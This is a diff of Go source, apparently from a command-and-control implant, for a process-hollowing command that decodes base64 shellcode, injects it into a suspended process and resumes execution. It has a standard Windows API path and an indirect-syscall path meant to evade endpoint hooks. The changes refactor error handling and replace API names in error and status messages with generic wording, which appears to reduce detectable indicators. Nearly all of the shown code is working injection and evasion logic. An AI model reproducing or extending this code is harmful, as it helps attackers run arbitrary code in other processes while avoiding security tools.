@@ -34,45 +34,25 @@ var procVirtualProtectExHollow = kernel32.NewProc("VirtualProtectEx")
 
 func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return structs.CommandResult{
-			Output:    "Error: parameters required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: parameters required")
 	}
 
 	var params hollowParams
 	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	if params.ShellcodeB64 == "" {
-		return structs.CommandResult{
-			Output:    "Error: shellcode_b64 is required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: shellcode_b64 is required")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return structs.CommandResult{
-			Output:    "Error: shellcode is empty",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: shellcode is empty")
 	}
 
 	if params.Target == "" {
@@ -84,18 +64,10 @@ func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
 
 	output, err := performHollowing(shellcode, params)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("\n[!] Hollowing failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("\n[!] Hollowing failed: %v", err))
 	}
 
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "completed",
-		Completed: true,
-	}
+	return successResult(output)
 }
 
 func performHollowing(shellcode []byte, params hollowParams) (string, error) {
@@ -229,7 +201,7 @@ func hollowStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	)
 	if remoteAddr == 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("VirtualAllocEx failed: %v", allocErr)
+		return sb.String(), fmt.Errorf("memory allocation failed: %v", allocErr)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Allocated memory at 0x%X\n", remoteAddr))
 
@@ -245,7 +217,7 @@ func hollowStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	)
 	if ret == 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("WriteProcessMemory failed: %v", writeErr)
+		return sb.String(), fmt.Errorf("memory write failed: %v", writeErr)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes\n", bytesWritten))
 
@@ -259,7 +231,7 @@ func hollowStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	)
 	if ret == 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("VirtualProtectEx failed: %v", protErr)
+		return sb.String(), fmt.Errorf("memory protection change failed: %v", protErr)
 	}
 	sb.WriteString("[+] Memory protection set to RX\n")
 
@@ -299,7 +271,7 @@ func hollowStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	ret, _, resumeErr := procResumeThread.Call(uintptr(pi.Thread))
 	if ret == ^uintptr(0) {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("ResumeThread failed: %v", resumeErr)
+		return sb.String(), fmt.Errorf("thread resume failed: %v", resumeErr)
 	}
 
 	sb.WriteString("[+] Thread resumed successfully\n")
@@ -314,29 +286,29 @@ func hollowIndirect(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	// Step 2: Allocate RW memory via NtAllocateVirtualMemory
 	regionSize := uintptr(len(shellcode))
 	var remoteAddr uintptr
-	sb.WriteString(fmt.Sprintf("[*] Allocating %d bytes via NtAllocateVirtualMemory...\n", len(shellcode)))
+	sb.WriteString(fmt.Sprintf("[*] Allocating %d bytes...\n", len(shellcode)))
 
 	status := IndirectNtAllocateVirtualMemory(uintptr(pi.Process), &remoteAddr, &regionSize,
 		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 	if status != 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("NtAllocateVirtualMemory failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("memory allocation failed: NTSTATUS 0x%X", status)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Allocated memory at 0x%X\n", remoteAddr))
 
-	// Step 3: Write shellcode via NtWriteVirtualMemory
-	sb.WriteString("[*] Writing shellcode via NtWriteVirtualMemory...\n")
+	// Step 3: Write shellcode
+	sb.WriteString("[*] Writing shellcode...\n")
 
 	var bytesWritten uintptr
 	status = IndirectNtWriteVirtualMemory(uintptr(pi.Process), remoteAddr,
 		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
 	if status != 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("NtWriteVirtualMemory failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("memory write failed: NTSTATUS 0x%X", status)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes\n", bytesWritten))
 
-	// Step 4: Change protection to RX via NtProtectVirtualMemory
+	// Step 4: Change protection to RX
 	protectAddr := remoteAddr
 	protectSize := uintptr(len(shellcode))
 	var oldProtect uint32
@@ -344,7 +316,7 @@ func hollowIndirect(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 		PAGE_EXECUTE_READ, &oldProtect)
 	if status != 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("NtProtectVirtualMemory failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("memory protection change failed: NTSTATUS 0x%X", status)
 	}
 	sb.WriteString("[+] Memory protection set to RX\n")
 
@@ -367,18 +339,18 @@ func hollowIndirect(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	status = IndirectNtSetContextThread(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
 	if status != 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("NtSetContextThread failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("thread context set failed: NTSTATUS 0x%X", status)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Set RCX to shellcode at 0x%X\n", remoteAddr))
 
 	// Step 7: Resume thread via NtResumeThread
-	sb.WriteString("[*] Resuming thread via NtResumeThread...\n")
+	sb.WriteString("[*] Resuming thread...\n")
 
 	var prevCount uint32
 	status = IndirectNtResumeThread(uintptr(pi.Thread), &prevCount)
 	if status != 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("NtResumeThread failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("thread resume failed: NTSTATUS 0x%X", status)
 	}
 
 	sb.WriteString(fmt.Sprintf("[+] Thread resumed (previous suspend count: %d)\n", prevCount))
